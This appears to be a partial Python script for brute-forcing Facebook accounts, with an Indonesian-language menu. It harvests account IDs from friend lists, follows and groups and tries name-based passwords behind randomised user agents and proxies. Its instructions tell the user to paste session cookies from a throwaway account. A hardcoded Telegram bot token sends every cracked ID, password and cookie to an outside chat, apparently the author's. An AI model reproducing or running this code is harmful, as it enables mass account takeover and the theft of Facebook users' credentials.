...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKiki_Wijaya-Xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A)'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Chrome'
	e=random.randrange(100, 9999)
	f='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/E7FBAF'
	...
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58'
...
ID="5587313827";
tok="5660344060:AAED1OE3pftSW0MKvOEBcVugy_wvF-OoA80"
#------------------[ MACHINE-SUPPORT ]---------------#
def jalan(u):
...
def banner():
    print("")
    cetak(nel("""[bold red]\t© Welcome To Scrip RegiGiyaa © [bold yellow]
__________              .__  ________.__                
\______   \ ____   ____ |__|/  _____/|__|___.__._____   
 |       _// __ \ / ___\|  /   \  ___|  <   |  |\__  \  
 |    |   \  ___// /_/  >  \    \_\  \  |\___  | / __ \_
 |____|_  /\___  >___  /|__|\______  /__|/ ____|(____  /
        \/     \/_____/            \/    \/          \/      
 
Autor  : RegiGiyaa
Kontak : 089509155154 
Status : Premium    """,title=f'[bold green]•[bold yellow]•[bold red]•[bold white][bold green]Logo Sctrip[bold green]•[bold yellow]•[bold red]•[bold white]', style='bold blue',subtitle='Tutor Login',width=80))
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel("""[bold white]tutor login script brute force \n1. download aplikasi [bold green] kiwi browser di [bold green]play store[bold white]\n2. buka aplikasi [bold green] kiwi browser[bold white] cari di halaman cookiedough web store\n3. tambahkan cookiedough ke mode destop\n4. cari di halaman m.facebook.com login facebook tumbal tumbal wajib tidak new atau temen max 50\n5. setelah masuk akun tumbal pencet titik 3 di pojok atas kiri salin cookie tempel""",style='cyan'))
		...
		ken=open(".tok.txt", "w").write(find_token.group(1));bot()
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	cetak(Panel('''[bold white][[bold green]01[bold white]] Crack Dari Pertemenan
[bold white][[bold green]02[bold white]] Crack Dari Follows
[bold white][[bold green]03[bold white]] Crack Dari Grup
[bold white][[bold green]04[bold white]] Crack Dari file
[bold white][[bold green]00[bold white]] Keluar Dari Script;''',width=80,style='bold blue'))
 # cetak(Panel(f'''     [bold white]Pilih Menu Sctrip''',style='bold green',width=80))
...
def dump_massal():
	...
	try:
		print('')
		print(f'{M}--->  {P}Terkumpul{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel("""[white][[green]01[white]] Crack Id Muda
[white][[green]02[white]] Crack Dari Id Tua
[white][[green]03[white]] Crack Dari Id Random""",style='cyan',title='Setting Id Crack'))
  
	hu = input(f'{M}---> {P}Pilih Id Crack : ')
	if hu in ['2','02']:
...
[bold white][[bold green]03[bold white]] Metode Free''',title='Setting Metode Login Url',style='cyan'))
	hc = input(f'{M}--->  {P}Pilih Metode Url: ')
...
#	elif hc in ['4','04']:
	...
	cetak(Panel('''[bold white][[bold green]01[bold white]] [bold white]Nama, Nama123, Nama1234
[bold white][[bold green]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345
[bold white][[bold green]03[bold white]] [bold white]Nama Full + Manual''',style='bold blue',width=80))
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input(f'{M}--->  {P}Pilih sandi : ')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		pwku=input(f'{M}--->  {P}Sandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	print('')
	jalan(f'{P}Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{H}[RegiGiyaa] {P}{b}{loop}{P}/{u}{len(id)}{P}/{P}{H}{ok}{P}/{P}{k}{cp}{x}/{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={idf}|{pw} ini bang setor akun cp").json()  
...
#print(f'\r{k}[🔒]→{idf}|{pw}\n{u}{uak}{N}')     					
					print(f'\r{U}{idf} • {pw}\n{B}{kuki}{N}')
					requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={idf}|{pw}{kuki} akun ok").json()
